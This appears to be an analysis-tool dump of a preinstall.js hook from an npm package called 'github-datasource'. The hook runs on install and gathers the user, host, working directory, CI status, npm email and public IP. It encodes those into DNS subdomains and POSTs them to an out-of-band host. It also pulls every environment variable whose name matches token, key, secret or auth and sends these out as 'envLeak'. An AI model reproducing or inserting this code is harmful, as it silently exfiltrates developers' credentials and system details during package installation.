// File: tmp/tmps9zat63i/github-datasource/package/preinstall.js
// ======================================================================
Line 1: const os = require('os')
Line 2: const dns = require('dns')
Line 3: const https = require('https')
Line 4: _tmp_2 = require('child_process')
Line 11: Buffer.from(str).toString('hex')
Line 15: const info = {
  user: os.userInfo().username || 'nouser',
  host: os.hostname() || 'nohost',
  cwd: process.cwd(),
  platform: os.platform(),
  arch: os.arch(),
  timestamp: Date.now().toString(36),
  ci: !!process.env.CI || !!process.env.GITHUB_ACTIONS,
  npm_email: process.env['NPM_CONFIG_EMAIL'] || 'noemail',
  npm_registry: process.env['NPM_CONFIG_REGISTRY'] || 'none'
}
Line 16: os.userInfo()
Line 17: os.hostname()
Line 19: os.platform()
Line 20: os.arch()
Line 21: Date.now().toString(36)
Line 23: _tmp_3.npm_email = process.env['NPM_CONFIG_EMAIL'] || 'noemail'
Line 24: _tmp_3.npm_registry = process.env['NPM_CONFIG_REGISTRY'] || 'none'
Line 28: [
  ...hexChunks(info.user),
  ...hexChunks(info.host),
  ...hexChunks(info.cwd),
  info.platform,
  info.arch,
  info.ci ? 'ci' : 'local',
  info.timestamp,
  OAST
].join('.')
Line 29: _tmp_6.push(...hexChunks(info.user))
Line 30: _tmp_6.push(...hexChunks(info.host))
Line 31: _tmp_6.push(...hexChunks(info.cwd))
Line 32: _tmp_6.push(info.platform)
Line 33: _tmp_6.push(info.arch)
Line 34: _tmp_6.push(info.ci ? "ci" : "local")
Line 35: _tmp_6.push(info.timestamp)
Line 36: _tmp_6.push(OAST)
Line 44: exec('curl -s https://api.ipify.org', (err, stdout) => {
  const ip = stdout.trim();
  const payload = JSON.stringify({ ...info, ip });

  const req = https.request({
    hostname: OAST,
    path: '/',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  }, () => {});
  req.on('error', () => {});
  req.write(payload);
  req.end();
})
Line 45: stdout.trim()
Line 48: const req = https.request({
    hostname: OAST,
    path: '/',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  }, () => {})
Line 55: req.write(payload)
Line 56: req.end()
Line 61: /token|key|secret|auth/i.test(k)
Line 65: {
  const req = https.request({
    hostname: OAST,
    path: '/',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  }, () => {});
  req.write(JSON.stringify({ envLeak: leaked }));
  req.end();
}
Line 66: const req = https.request({
    hostname: OAST,
    path: '/',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  }, () => {})
Line 72: req.write(JSON.stringify({ envLeak: leaked }))
Line 73: req.end()
